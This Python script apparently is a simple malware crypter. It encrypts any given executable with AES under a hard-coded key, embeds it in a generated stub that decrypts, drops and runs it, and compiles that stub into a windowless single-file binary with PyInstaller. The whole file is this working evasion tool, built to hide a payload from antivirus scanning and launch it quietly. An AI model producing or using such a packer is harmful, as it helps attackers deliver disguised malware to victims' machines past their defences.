import pyaes
import sys
import os

KEY = b'0123456789123456'
file = sys.argv[1]
dropfile = sys.argv[2]
stub_name = 'stub.py'

with open(file, "rb") as file:
    executavel = file.read()

executavel_crypt = pyaes.AESModeOfOperationCTR(KEY).encrypt(executavel)



stub = f"""
import pyaes
import subprocess

KEY = {KEY}
executavel_crypt = {executavel_crypt}
dropfile = '{dropfile}'

executavel_decrypt = pyaes.AESModeOfOperationCTR(KEY).decrypt(executavel_crypt)
with open(dropfile, "wb") as file:
    file.write(executavel_decrypt)

proc = subprocess.Popen(dropfile)
"""

with open(stub_name, "w") as file:
    file.write(stub)

os.system("pyinstaller -F -w --clean {}".format(stub_name))